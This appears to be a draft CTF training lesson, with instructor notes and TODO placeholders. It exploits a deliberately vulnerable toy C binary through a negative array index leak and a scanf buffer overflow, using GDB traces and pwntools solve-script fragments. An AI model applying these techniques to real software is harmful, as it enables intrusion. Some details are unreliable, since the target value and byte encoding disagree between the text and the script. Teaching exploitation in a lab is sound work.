PwRIVATE NOTE: Getting familiar with pwntools, negative index to overwrite variable and buffer overflow variable. (Same challenge)

# PWN Example 01

This example will introduce you to `pwntools`, in addition to some exploitation of more simple bugs.

In your docker image, this example is available at `TODO: Directory`, and is also running on port `TODO: Port`.

## Compiling and Running the Program

A binary called `example01` should be in this directory. If you run `./example01`, you can see it's behavior.

PRIVATE NOTE: Actually run the example and show what it does.

In most real CTFs, pwn challenges will provide you with the program, but also be running it on a remote service, which you are supposed to exploit. In our case, a service is running on a port. To connect to the port, just run:
```bash
$ nc localhost TODO: Port
```

Note: If the program is not executable for some reason (You might see an error like `permission penied: ./example01`), you may need to run `chmod u+x ./example01` to mark the binary as executable.

In the example directory, the source code and a Makefile is provided. If you need to recompile, just run `make`.

## Reading the Code and Identifying Vulnerabilities

For this example, and all the rest of these lessons, source will be provided. This is not realistic. Most CTFs will not provide source for binary exploitation challenges, but it is much easier to teach the basics of binary exploitation with out worring about reverse engineering.

PRIVATE NOTE: The bootcamp CTF will provide source for most, if not all of the pwn challenges.

You will notice these two lines at the top of most pwn challenges written in C or C++:
```c
setvbuf(stdin, 0, 2, 0);
setvbuf(stdout, 0, 2, 0);
```
These disable line buffering in the program to make it easer to interact with the program over the network. Generally, you will not need to worry about these lines of code.

There are two bugs in this example that we will exploit, but there are at least 4 vulnerabilities in the example. **Before reading on, go ahead and look for the vulnerabilities yourself.**

PRIVATE NOTE: Does anyone in chat see the bugs?

### Bug #1

The first bug is an out of bounds array access. An unconstrained integer input is directly used as an array index. These are seen fairly often in CTFs.

```c
struct {
    int secret_number;      // Secret Number
    int number_list[16];    // List of known numbers
    char name[32];          // Name of Winner
    int score;              // Your score
} game_state ;

...

printf("Which number in number_list would you like to print?\n> ");
int choice;
scanf("%d", &choice);

printf("number_list[%d] = %d\n", choice, game_state.number_list[choice]);
```

The function `scanf` will read any integer, and `printf` will print `game_state.number_list[choice]`. Unlike higher-level languages, in C, arrays are just pointers. These lines are equivalent:
```
*(&(game_state.number_list) + choice) == game_state.number_list[choice]
```

This means that if we provide an index less than 0 or greater than 15, we will read out of bounds. The items in the struct are in the same order in memory, so an index of `-1` will read the `secret_number`.
```
━━┫ ./example01 
Which number in number_list would you like to print?
> -1
number_list[-1] = 107
Now guess the secret number.
> 107
You are right! Score: 1337
```

We can use GDB to look at the memory and see that this is the case:
```
gef➤  p game_state 
$1 = {
  secret_number = 0x89,
  number_list = {0x158, 0x334, 0x371, 0x257, 0x1e1, 0x12f, 0x396, 0x339, 0x24d, 0x33a, 0xb4, 0x269, 0x1ab, 0x236, 0x32d, 0x364},
  name = '\000' <repeats 12 times>, "\200\023@\000\000\000\000\000\260\020@\000\000\000\000\000\200\273\377\377",
  score = 0x7fff
}
gef➤  x/16xw &game_state 
0x7fffffffba20: 0x00000089      0x00000158      0x00000334      0x00000371
0x7fffffffba30: 0x00000257      0x000001e1      0x0000012f      0x00000396
0x7fffffffba40: 0x00000339      0x0000024d      0x0000033a      0x000000b4
0x7fffffffba50: 0x00000269      0x000001ab      0x00000236      0x0000032d
gef➤  p &game_state.secret_number
$2 = (int *) 0x7fffffffba20
gef➤  p &game_state.number_list
$3 = (int (*)[16]) 0x7fffffffba24
gef➤  p game_state.number_list[-1]
$4 = 0x89
gef➤  p &game_state.number_list[-1] == &game_state.secret_number
$5 = 0x1
```

The correct way to patch this bug would be to simply add checks on the size before the index is used.

### Bug #2

The second bug is a buffer overflow. The code will read your input beyond the max length of the buffer that it is filling. This is possibly the most commonly seen vulnerability in CTFs, and used to be the most commonly exploited vulnerability in production software (Now it's probably use-after-free attacks, at least for major software).

TODO: Inline code, explained
```c
printf("Enter your name to save your score:\n> ");
scanf("%s", game_state.name);
```

The function `scanf`, if given an argument of `"%s"`, will read an unlimited number of characters, causing a buffer overflow. The function `gets(char *)` is similarly dangerous, and functions that read a number of characters (like `fgets`) are dangerous if the number of characters requested is larger than the size of the buffer.

Let's demonstrate this buffer overflow in GDB:

Note: Sometimes, compilers will try to put strings after other data types to reduce the likelyhood of overflows like this, so order can not be gaurenteed, and you should generally check the assembled binary. In our case, the example has everything within a struct, preserves memory order with optimization disabled in gcc.

The length of `name` is 32 bytes, so if we were to write more than 32 bytes, we would overflow into `score`, which is right after `name` in memory. We can see this in gdb:
```
gef➤  break 41
gef➤  break 49
gef➤  r
Which number in number_list would you like to print?
> -1
number_list[-1] = 745
Now guess the secret number.
> 745
You are right! Score: 1337
gef➤  p game_state.name
$1 = '\000' <repeats 12 times>, "\200\023@\000\000\000\000\000\260\020@\000\000\000\000\000\200\273\377\377"
gef➤  p game_state.score
$2 = 0x539
gef➤  c
Continuing.
Enter your name to save your score:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
gef➤  p game_state.name 
$3 = 'A' <repeats 32 times>
gef➤  p game_state.score
$4 = 0x42424242
```
We overwrote score with `BBBB`, which displayed as a hex number, is `0x42424242`. To find the easter egg at line 50, we will need to send `0x00001338`, encoded as bytes (which will look like `\x00\x00\x13\x38`).

### Bugs #3 and #4

The other two bugs have to do with how the random number is generated. The random number generator is seeded with time:
```c
srand(time(NULL));
```

This means that an attacker who knows the time that the program is run at will be able to guess what random number is generated.

The other bug is that the random number only has 1000 possibilities, which means that if an attacker was able to run the program multiple times, they could keep trying until they match the random number in a brute force attack.
```c
secret_number = rand() % 1000; // Generate an impossible to guess number
```

We will not be needing to exploit either of these bugs in this example, but feel free to write solutions that use these as practice! The exploitation of either of these bugs can be exchanged with exploitation of the first bug - out of bounds array access.

## Creating a Reuseable Solve Script

Especially as challenges get longer and require dealing with binary data, it becomes necessary to script your solution. This not only makes it easy to interact with a binary programmatically, but it also ensures reproducibility of your solution.

To do this, we usually use Python and the library pwntools. They should both be installed on the dockers, but a simple `pip install pwntools` will install it if you are working on your own machine. Their documentation is available [here](http://docs.pwntools.com/en/stable/), and it is quite good.

PRIVATE NOTE: There are a couple awesome pwntools features that we will get to as we progress. It can help debug, find offsets in multiple ways, emulate and debug programs for different architectures, and more.
PRIVATE NOTE: Start writing a pwntools script

A pwntools script almost always starts by importing everything in pwntools with:
```python
from pwn import *
```

Importing everything from a package is generally a bad Python practice for software development, but our solutions will generally be in one file and speed of development during a competition is (usually) more important than Good Code.

In our case, we want to interact with our binary:
```python
p = process('./example01')
```

This opens the binary as a process, and we can now read and write to it from python. In order to interact with a remote (this challenge is running on port TODO: Port for example), we can do
```python
r = remote('127.0.0.1', TODO: Port)
```

The API for a process and remote is generally the same, so it is easy to solve the remote once you have a working solution locally. Sometimes you will see something like this in a pwntools script:
```python
if '--remote' in sys.argv:
    p = remote('127.0.0.1', TODO: Port)
else:
    p = process('./example01')
``` 

Now that we have a process in pwntools, we can interact with it. Some useful tools to read and write to a program are:
```python
# Write To Process
p.send(message)
p.sendline(line) # Appends a '\n' to your input
p.sendlineafter(b' >', line)

# Read From Process
p.recv() # Recieves until latest character
p.recvline()
p.recvuntil(b' >')
p.recvall() # Recieves until an EOF is reached

# Manual Control
p.interactive()
```

Using something like `p.interactive()` is useful once you successfully exploit a binary and have a shell that you need to navigate around in. More tools are available, such as `p.recvline_regex` and many others, but the above basics should get you far enough. If you need more, check the docs.

PRIVATE NOTE: Start with 3 line program, ending with p.interactive(), and add code to the middle

In our case, we want to exploit both the vulnerabilities we found when reading the code. 

### Exploiting Vuln #1

To exploit the first vulnerability, we need to request a '-1' index to be read from. This is as simple as sending '-1' as our first input.
```python
from pwn import *
p = process('./example01')
p.sendline('-1')
p.interactive()
```

This leaks the value, but now we need to read it, and send it back to the program in the next line. It also tends to be good practice to recieve inputs up to when you need to send your input, so that you can work on smaller strings. Another good practice is to always send and recieve bytes objects (in the format `b''`), since python3 occasionally has undesirable behavior with unicode in strings.
```python
from pwn import *
import re

# Exploit Vuln #1
p = process('./example01')
p.recvuntil(b'> ')  # Recieve until prompted for input
p.sendline(b'-1')
response = p.recvuntil(b'> ')
leak = re.findall(br"(\d+)$", response, flags=re.MULTILINE)[0]
p.sendline(leak)
print('leak: {}'.format(leak))
p.interactive()
```

In this case, we used a regex to extract the value of `secret_number` from the output. Python has many fantastic string manipulation tools, so there are many ways that the value could be extracted from the string.

### Exploiting Vuln #2

Exploiting the second vulnerability is also relatively simple. After being prompted to input our name, we need to send 32 bytes of name, and then we can overflow into our score.
```python
payload = b'A' * 32 + p32(0x1337)
p.sendline(payload)
```
Pwntools has awesome helper functions `p32(int)` and `p64(long)`, which will by default encode the integer as little endian, how numbers are encoded in memory on most machines. These functions will be used a ton to encode addresses and other numbers in further challenges.
